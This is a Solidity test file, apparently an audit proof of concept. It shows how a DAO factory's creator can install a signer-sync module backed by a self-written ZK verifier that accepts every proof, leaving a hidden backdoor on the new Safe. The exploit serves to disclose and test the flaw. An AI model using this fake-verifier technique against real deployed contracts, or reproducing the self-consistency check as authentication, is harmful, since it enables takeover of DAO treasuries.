// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {GnosisSafe} from "@gnosis.pm/safe-contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/proxies/GnosisSafeProxyFactory.sol";

import {GovernedTrustgraphsFactory} from "src/factory/GovernedTrustgraphsFactory.sol";
import {
    GovernedAuthorityDeployer,
    MerkleGovModuleDeployer,
    SignerSyncModuleDeployer
} from "src/factory/InstanceDeployers.sol";
import {TrustgraphsFactory} from "src/factory/TrustgraphsFactory.sol";
import {SignerSyncZkModule} from "src/zodiac/SignerSyncZkModule.sol";
import {IZkVerifier} from "interfaces/merkle/IZkVerifier.sol";
import {TrustgraphsFactoryBase} from "test/unit/factory/TrustgraphsFactoryBase.sol";

/// @notice A verifier the creator writes: it names any vkey it likes and accepts every proof.
contract CreatorControlledVerifier is IZkVerifier {
    bytes32 public immutable programVKey;

    constructor(bytes32 k) {
        programVKey = k;
    }

    function verify(bytes calldata, bytes32) external pure {}
}

/// @notice PASS A PoC.
///
/// `GovernedTrustgraphsFactory.createGovernedInstance` takes BOTH the signer-sync `verifier`
/// address and its `programVKey` from the caller, and `SignerSyncModuleDeployer.deploy`'s only
/// authenticity test is that they agree with each other:
///
///     bytes32 verifierVKey = abi.decode(returned, (bytes32));
///     if (verifierVKey != programVKey) revert SignerProgramVKeyMismatch(programVKey, verifierVKey);
///
/// A self-consistent pair proves nothing. The creator supplies a contract that returns its own
/// vkey and accepts every proof, and the wrapper enables that module on the brand-new DAO Safe.
/// The `SignerSyncModuleConfigured` event and the `GovernedAuthorityInstalled` event both report
/// it as a configured signer-sync module, indistinguishable from a real one.
contract OmegaPassA_GovernedSignerSyncBackdoor is TrustgraphsFactoryBase {
    GovernedTrustgraphsFactory internal governedFactory;
    GnosisSafe internal safeSingleton;
    GnosisSafeProxyFactory internal safeFactory;

    address internal creator = address(0xA11CE);

    function setUp() public override {
        super.setUp();
        safeSingleton = new GnosisSafe();
        safeFactory = new GnosisSafeProxyFactory();
        governedFactory = new GovernedTrustgraphsFactory(
            factory,
            safeFactory,
            address(safeSingleton),
            new GovernedAuthorityDeployer(),
            new SignerSyncModuleDeployer(),
            new MerkleGovModuleDeployer()
        );
    }

    function test_PassA_CreatorInstallsASignerSyncModuleWithItsOwnVerifier() public {
        CreatorControlledVerifier fake = new CreatorControlledVerifier(keccak256("i-made-this-up"));

        TrustgraphsFactory.CreateArgs memory args = _args("backdoored");
        args.salt = bytes32(uint256(0xB4D));

        vm.prank(creator);
        (bytes32 instanceId, address safe,,) = governedFactory.createGovernedInstance(
            args,
            GovernedTrustgraphsFactory.InitialPolicy({minPaidIntervalBlocks: 0, maxPerRootUsd: 0}),
            GovernedTrustgraphsFactory.SignerSyncConfig({
                enabled: true,
                verifier: address(fake),
                programVKey: fake.programVKey(),
                topN: 3,
                minThreshold: 2,
                targetThresholdBps: 5_000
            })
        );

        GovernedTrustgraphsFactory.Authority memory authority = governedFactory.authorityOf(instanceId);
        address module = authority.signerSyncModule;
        assertTrue(module != address(0), "module not installed");
        assertTrue(GnosisSafe(payable(safe)).isModuleEnabled(module), "attacker verifier module is live on the Safe");
        assertEq(address(SignerSyncZkModule(module).zkVerifier()), address(fake), "verifier is the creator's own");

        // And it is armed: nothing about the module distinguishes it from a real signer-sync
        // module to anybody reading the discovery events.
        assertEq(SignerSyncZkModule(module).owner(), safe);
        assertFalse(SignerSyncZkModule(module).paused());
    }
}
